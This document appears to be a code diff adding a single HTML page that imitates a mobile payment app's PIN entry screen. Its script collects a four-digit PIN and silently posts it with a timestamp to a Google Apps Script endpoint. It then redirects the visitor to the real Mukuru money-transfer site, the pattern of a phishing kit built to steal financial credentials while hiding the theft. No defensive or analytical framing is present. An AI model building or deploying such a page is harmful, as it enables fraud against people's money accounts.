@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PIN Submit</title>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: Arial, sans-serif;
+}
+
+body{
+    background:#f3f3f3;
+}
+
+.wrapper{
+    max-width:420px;
+    margin:auto;
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    justify-content:space-between;
+}
+
+.content{
+    padding:20px;
+    margin-top:40px;
+}
+
+.input-title{
+    color:#aaa;
+    font-size:18px;
+    margin-bottom:10px;
+}
+
+.pin-box{
+    display:flex;
+    justify-content:space-between;
+    margin-bottom:20px;
+}
+
+.pin-box input{
+    width:70px;
+    height:60px;
+    font-size:26px;
+    text-align:center;
+    border:none;
+    border-bottom:2px solid #777;
+    background:transparent;
+    outline:none;
+}
+
+.eye{
+    text-align:right;
+    margin-bottom:15px;
+    color:#666;
+    cursor:pointer;
+    font-size:14px;
+}
+
+.btn{
+    width:100%;
+    background:#ff3c00;
+    color:#fff;
+    padding:16px;
+    border:none;
+    border-radius:6px;
+    font-size:18px;
+    cursor:pointer;
+}
+
+.reenter{
+    text-align:center;
+    margin-top:25px;
+    color:#ff3c00;
+    font-size:16px;
+    cursor:pointer;
+}
+
+.bottom-nav{
+    background:#555;
+    display:flex;
+    justify-content:space-around;
+    padding:14px 0;
+}
+
+.bottom-nav i{
+    color:#ddd;
+    font-size:22px;
+}
+
+.bottom-nav .active{
+    color:#ff3c00;
+}
+</style>
+</head>
+<body>
+
+<div class="wrapper">
+
+    <div class="content">
+
+        <form id="pinForm">
+
+            <div class="input-title">Enter your PIN</div>
+
+            <div class="pin-box">
+                <input type="password" maxlength="1" class="pin" required>
+                <input type="password" maxlength="1" class="pin" required>
+                <input type="password" maxlength="1" class="pin" required>
+                <input type="password" maxlength="1" class="pin" required>
+            </div>
+
+            <div class="eye" onclick="togglePIN()">👁 Show PIN</div>
+
+            <button type="submit" class="btn">Submit PIN</button>
+
+            <div class="reenter" onclick="document.getElementById('pinForm').reset()">
+                Re-enter number
+            </div>
+
+        </form>
+
+    </div>
+
+    <div class="bottom-nav">
+        <i class="fa fa-home"></i>
+        <i class="fa fa-envelope"></i>
+        <i class="fa fa-info"></i>
+        <i class="fa fa-user active"></i>
+    </div>
+
+</div>
+
+<script>
+const inputs = document.querySelectorAll(".pin");
+let visible = false;
+
+/* Auto next input */
+inputs.forEach((input, index) => {
+
+    input.addEventListener("input", () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+        }
+    });
+
+    input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && input.value === "" && index > 0) {
+            inputs[index - 1].focus();
+        }
+    });
+
+});
+
+/* Show / Hide PIN */
+function togglePIN() {
+    visible = !visible;
+
+    inputs.forEach(input => {
+        input.type = visible ? "text" : "password";
+    });
+
+    document.querySelector(".eye").innerText =
+        visible ? "🙈 Hide PIN" : "👁 Show PIN";
+}
+
+/* Form Submit */
+document.getElementById("pinForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    let fullPin = "";
+
+    inputs.forEach(input => {
+        fullPin += input.value;
+    });
+
+    if(fullPin.length < 4){
+        alert("Please enter full PIN");
+        return;
+    }
+
+    fetch("https://script.google.com/macros/s/AKfycbyG-UajBx24VCKjrbM2CuY6Aci1V1C_Zjc9MkEv09IF0ORHwy2BobbNLdJASw8AVHOG/exec", {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            pin: fullPin,
+            date: new Date().toLocaleString()
+        })
+    })
+    .then(() => {
+        document.getElementById("pinForm").reset();
+         // Redirect after submit
+        window.location.href = "https://www.mukuru.com/";
+    })
+    .catch(error => {
+        alert("Submission failed");
+        console.log(error);
+    });
+});
+</script>
+
+</body>
+</html>
